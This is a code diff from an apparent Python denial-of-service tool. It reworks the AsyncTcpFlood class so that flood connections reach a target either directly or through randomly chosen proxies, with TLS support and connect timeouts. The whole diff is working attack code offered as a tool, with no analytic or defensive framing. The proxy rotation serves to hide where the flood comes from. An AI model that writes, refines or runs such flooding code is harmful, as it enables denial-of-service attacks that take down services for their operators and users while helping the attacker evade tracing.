@@ -718,7 +718,7 @@ class AsyncTcpFlood(HttpFlood):
     async def _close_connection(self, writer: asyncio.StreamWriter) -> None:
         if writer.can_write_eof():
             writer.write_eof()
-        elif self._settings.transport == AttackSetting.TRANSPORT_SOCK:
+        elif self._settings.transport == AttackSettings.TRANSPORT_SOCK:
             writer.get_extra_info("socket")._sock.close()
             self._stats.track_close_connection()
         else:
@@ -782,24 +782,43 @@ class AsyncTcpFlood(HttpFlood):
         *,
         rpc: Optional[int] = None
     ) -> bool:
-        # XXX: most of this code should be inside proto module
-        on_done = self._loop.create_future()
-        proxy_url: str = self._proxies.pick_random()
-        proxy = Proxy.from_url(proxy_url)
-        proxy_protocol = proto.for_proxy(proxy) 
+        on_close = self._loop.create_future()
+        flood_proto = partial(
+            proto.FloodAttackProtocol,
+            self._loop,
+            on_close,
+            self._stats,
+            self._settings,
+            payload,
+        )
         is_tls = self._target.scheme.lower() == "https" or self._target.port == 443
+        server_hostname = "" if is_tls else None
         ssl_ctx = ctx if is_tls else None
-
-        def _protocol_factory():
-            return proxy_protocol(
-                self._loop, proxy_url, proxy, self._raw_target, ssl_ctx, on_done,
-                downstream_factory = partial(
-                    proto.FloodAttackProtocol,
-                    self._loop, self._stats, payload, self._settings, on_done))
-        
-        await self._loop.create_connection(
-            _protocol_factory, host=proxy.proxy_host, port=proxy.proxy_port)
-        return bool(await on_done)
+        proxy_url: str = self._proxies.pick_random()
+        if proxy_url is None:
+            conn = self._loop.create_connection(
+                flood_proto,
+                host=self._addr,
+                port=self._target.port,
+                ssl=ssl_ctx,
+                server_hostname=server_hostname
+            )
+        else:
+            proxy, proxy_protocol = proto.for_proxy(proxy_url)
+            flood_proto = partial(
+                proxy_protocol,
+                self._loop,
+                on_close,
+                self._raw_target,
+                ssl_ctx,
+                downstream_factory=flood_proto,
+                connect_timeout=self._settings.connect_timeout_seconds,
+            )
+            conn = self._loop.create_connection(
+                flood_proto, host=proxy.proxy_host, port=proxy.proxy_port)
+        async with timeout(self._settings.connect_timeout_seconds):
+            await conn
+        return bool(await on_close)
 
     # XXX: again, with functions it's just a partial
     async def GET(self) -> bool:
